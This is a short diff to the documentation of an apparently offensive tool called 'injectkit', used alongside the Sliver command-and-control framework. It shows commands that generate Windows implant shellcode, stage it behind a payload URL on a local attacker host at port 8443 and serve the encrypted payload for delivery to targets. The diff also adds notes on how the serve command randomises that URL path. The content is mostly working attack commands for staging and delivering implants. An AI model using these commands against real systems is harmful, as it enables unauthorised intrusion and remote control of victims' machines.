@@ -301,9 +301,11 @@ sliver > generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.
 ```bash
 ./injectkit stage \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/payload \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
+
+Note: When `--serve` is used, only the host:port is needed — the path is auto-generated and printed in the output.
 
 Copy the printed commands and use whichever delivery path fits the engagement.
 
@@ -312,6 +314,8 @@ Copy the printed commands and use whichever delivery path fits the engagement.
 ```bash
 ./injectkit serve --payload build/payload.enc --port 8443
 ```
+
+Note: `injectkit serve` generates a new random URL path each time it runs. You must update the `--url` in your `injectkit.exe` or Sliver extension command to use the URL printed by `serve`.
 
 ---
 
